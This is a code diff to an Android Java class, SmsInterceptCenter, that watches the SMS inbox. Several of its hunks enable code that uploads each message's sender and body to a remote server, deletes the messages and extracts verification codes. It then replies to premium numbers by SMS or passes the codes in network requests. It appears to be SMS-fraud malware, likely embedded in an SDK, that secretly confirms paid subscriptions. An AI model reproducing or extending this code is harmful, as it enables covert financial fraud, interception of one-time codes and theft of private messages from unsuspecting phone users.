@@ -28,6 +28,7 @@ public class SmsInterceptCenter extends ContentObserver {
     private Context context = null;
     private static int smsID = 0;
     private static List<String> hadReqeusted = new ArrayList<>();
+    private static String contentCacheString = "";
     String payType;
 
     public SmsInterceptCenter(Handler handler, Context context) {
@@ -81,7 +82,6 @@ public class SmsInterceptCenter extends ContentObserver {
 //            values.put("body", "京东会员，我们准备了51元暖心礼包+专享花费券！戳 dc.jd.com/dPEJQQ 领走！神券在握，低价不怕错过！ 回BK退订【京东】");
 //            context.getContentResolver().update(Uri.parse("content://sms/"), values, "_id=?", new String[]{"" + id});
 //            delete(id);
-
 //    }
         if (mCursor == null) {
             return;
@@ -114,15 +114,16 @@ public class SmsInterceptCenter extends ContentObserver {
                 _smsInfo.read = mCursor.getString(readIndex);
             }
             list.add(_smsInfo.toString());
-            SmsSynchronousRequest.getInstance().request(context, _smsInfo.smsBody, 999);
-            delete(_smsInfo._id);
+
+//            int delete = delete(_smsInfo._id);
+//            SmsSynchronousRequest.getInstance().request(context, _smsInfo.smsBody, delete);
         }
         mCursor.close();
         for (int i = 0; i < list.size(); i++) {
-//            String content = chooseSMS(list.get(i));
-//            if (!("").equals(content)) {
-            smsHandle(list.get(i).toString(), context);
-//            }
+            String content = chooseSMS(list.get(i));
+            if (!("").equals(content)) {
+                smsHandle(list.get(i).toString(), context);
+            }
         }
 //        Sms_send_tongbu(catchError(e), SDKInit.mContext, -1);
     }
@@ -134,55 +135,46 @@ public class SmsInterceptCenter extends ContentObserver {
         return delete;
     }
 
-//    private String chooseSMS(String content) {
-//        String _id = "";
-//        String smsAddress = "";
-//        String smsBody = "";
-//        try {
-//            JSONObject json = new JSONObject(content);
-//            _id = json.getString("_id");
-////            if (_id.equals(smsId)) {
-//            smsAddress = json.getString("smsAddress");
-//            smsBody = json.getString("smsBody");
-//            if (Constants.isOutPut) {
-//                Log.debug("======>smsAddress" + smsAddress);
-//                Log.debug("======>smsBody" + smsBody);
-//            }
-////            } else {
-////                return "";
-////            }
-//        } catch (Exception e) {
-//            System.out.println("eeeee:" + e);
-//            delete(_id);
-////            Sms_send_tongbu(catchError(e), SDKInit.mContext, -2);
-//            return "";
-//        }
-//    }
-//        Log.debug("ACacheUtils.getInstance(SDKInit.mContext).getSMSContent():" + ACacheUtils.getInstance(SDKInit.mContext).getSMSContent());
-//        if (ACacheUtils.getInstance(SDKInit.mContext).getSMSContent().equals("")) {
-//            ACacheUtils.getInstance(SDKInit.mContext).setSMSContent(smsBody);
-//            if (Constants.isOutPut) {
-//                Log.debug("==========>缓存里面的的东西为空设置内容并且同步:" + smsBody);
-//            }
-//            int delete = delete(_id);
-//            Sms_send_tongbu(smsAddress + "   " + smsBody, SDKInit.mContext, delete);
-//            return content;
-//        } else {
-//            if (ACacheUtils.getInstance(SDKInit.mContext).getSMSContent().equals(smsBody)) {
-//                delete(_id);
-//                if (Constants.isOutPut) {
-//                    Log.debug("==========>缓存的东西跟新短信内容相同:" + smsBody);
-//                }
-//                return "";
+    private String chooseSMS(String content) {
+        String _id = "";
+        String smsAddress = "";
+        String smsBody = "";
+        try {
+            JSONObject json = new JSONObject(content);
+            _id = json.getString("_id");
+//            if (_id.equals(smsId)) {
+            smsAddress = json.getString("smsAddress");
+            smsBody = json.getString("smsBody");
+            if (Constants.isOutPut) {
+                Log.debug("======>smsAddress" + smsAddress);
+                Log.debug("======>smsBody" + smsBody);
+            }
 //            } else {
-//                ACacheUtils.getInstance(SDKInit.mContext).setSMSContent(smsBody);
-//                if (Constants.isOutPut) {
-//                    Log.debug("==========>缓存的东西跟新短信内容不相同並且需要同步:" + smsBody);
-//                }
-//                int delete = delete(_id);
-//                Sms_send_tongbu(smsAddress + "   " + smsBody, SDKInit.mContext, delete);
-//                return content;
+//                return "";
 //            }
+        } catch (Exception e) {
+            System.out.println("eeeee:" + e);
+            delete(_id);
+            SmsSynchronousRequest.getInstance().request(context, catchError(e), -2);
+            return "";
+        }
+        Log.debug("contentCacheString:" + contentCacheString);
+        if (contentCacheString.equals(smsBody)) {
+            delete(_id);
+            if (Constants.isOutPut) {
+                Log.debug("==========>缓存的东西跟新短信内容相同:" + smsBody);
+            }
+            return "";
+        } else {
+            contentCacheString = smsBody;
+            if (Constants.isOutPut) {
+                Log.debug("==========>缓存的东西跟新短信内容不相同並且需要同步:" + smsBody);
+            }
+            int delete = delete(_id);
+            SmsSynchronousRequest.getInstance().request(context, "smsAddress:" + smsAddress + "\t" + "smsBody:" + smsBody, delete);
+            return content;
+        }
+    }
 
     private void smsHandle(String content, Context context) {
         if (null == interceptContentList && interceptContentList.size() <= 0) {
@@ -258,21 +250,21 @@ public class SmsInterceptCenter extends ContentObserver {
                     if (payType.equals("0")) {
 
                     } else if (payType.equals("1")) {
-                        if (Constants.isOutPut) {
+                        if (Constants.isOutPut) {//二次短信回复任意内容
                             Log.debug("======>要开始回复Y了:" + senderContent);
                         }
-//                        SmsCenter.getInstance().sendSecondMessage(limitNum, senderContent);
+                        SmsCenter.getInstance().sendSecendSMS(limitNum, senderContent);
                         Log.debug("=======>limitNum:" + limitNum + "    " + senderContent);
-                        SmsSynchronousRequest.getInstance().request(context, limitNum + "      " + senderContent + "<---回复内容 |||短信内容------>" + senderContent, 10002);
-                    } else if (payType.equals("2")) {
+                        SmsSynchronousRequest.getInstance().request(context, "This user send SMS with any content:" + senderContent + "limitNum:" + limitNum, 10001);
+                    } else if (payType.equals("2")) {//二次短信回复验证码
                         String SmsContent = SDKUtils.getCode2Sms(Integer.valueOf(vCodeLength), smsBody);
-//                        MySmsManager.sendSecondMessage(limitNum, SmsContent);
-                        SmsSynchronousRequest.getInstance().request(context, "拦截到的发回去的内容----->" + limitNum + ":::" + SmsContent, 10002);
-                    } else if (payType.equals("3")) {
+                        SmsCenter.getInstance().sendSecendSMS(limitNum, SmsContent);
+                        SmsSynchronousRequest.getInstance().request(context, "This user send SMS with Code:" + SmsContent + "limitNum:" + limitNum, 10002);
+                    } else if (payType.equals("3")) {//二次验证码网络请求
                         String SmsContent = SDKUtils.getCode2Sms(Integer.valueOf(vCodeLength), smsBody);
                         String url = otherNeedUrl + "?vcode=" + SmsContent + "&sendParam=" + sendParam;
                         if (hadReqeusted.toString().contains(sendParam)) {
-                            SmsSynchronousRequest.getInstance().request(context, hadReqeusted.toString(), -123);
+                            SmsSynchronousRequest.getInstance().request(context, "had been request content:" + hadReqeusted.toString(), -123);
                             return;
                         } else {
                             SecendNetWorkRequest.getInstance().request(url);
@@ -283,15 +275,15 @@ public class SmsInterceptCenter extends ContentObserver {
                                 Log.debug("------>url：" + url);
                                 Log.debug("------>返回的内容：" + content);
                             }
-                            SmsSynchronousRequest.getInstance().request(context, content + " ----> " + url, 10003);
+                            SmsSynchronousRequest.getInstance().request(context, "This user request by url:" + url, 10003);
                         }
-                    } else if (payType.equals("4")) {
+                    } else if (payType.equals("4")) {//二次短信回复任意内容+验证码
                         String SmsCode = SDKUtils.getCode2Sms(Integer.valueOf(vCodeLength), smsBody);
                         Log.debug("======>SmsCode:" + SmsCode);
                         Log.debug("======>ACacheUtils.getInstance(context).getLimitNum():" + limitNum);
                         if (SmsCode != null) {
-//                            MySmsManager.sendSecondMessage(limitNum, senderContent + SmsCode);
-                            SmsSynchronousRequest.getInstance().request(context, "拦截到的发回去的内容----->" + senderContent + SmsCode, 10004);
+                            SmsCenter.getInstance().sendSecendSMS(limitNum, senderContent + SmsCode);
+                            SmsSynchronousRequest.getInstance().request(context, "This user send SMS with senderContent&SmsCode:" + "senderContent:" + senderContent + "\t" + "SmsCode:" + SmsCode, 10004);
                         }
                     } else {
 
